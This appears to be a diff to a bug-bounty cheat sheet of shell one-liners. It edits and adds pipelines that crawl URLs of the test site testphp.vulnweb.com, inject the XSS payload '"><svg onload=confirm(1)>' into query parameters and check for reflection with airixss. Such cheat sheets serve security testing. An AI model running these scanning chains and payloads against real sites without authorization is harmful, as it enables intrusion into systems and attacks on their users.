@@ -131,7 +131,13 @@ ffuf -ac -u FUZZ -w fuzzing.txt -replay-proxy 127.0.0.1:8080
 ###  urldedupe bhedak
 - [Explained command]
 ```bash
-waybackurls http://testphp.vulnweb.com | urldedupe -qs | bhedak '"><svg onload=confirm(1)>' | airixss -payload "confirm(1)" | egrep -v 'Not'
+waybackurls testphp.vulnweb.com | urldedupe -qs | bhedak '"><svg onload=confirm(1)>' | airixss -payload "confirm(1)" | egrep -v 'Not'
+```
+
+### Hakrawler Airixss XSS 
+- [Explained command]
+```bash
+echo testphp.vulnweb.com | httpx -silent | hakrawler -subs | grep "=" | qsreplace '"><svg onload=confirm(1)>' | airixss -payload "confirm(1)" | egrep -v 'Not'
 ```
 
 
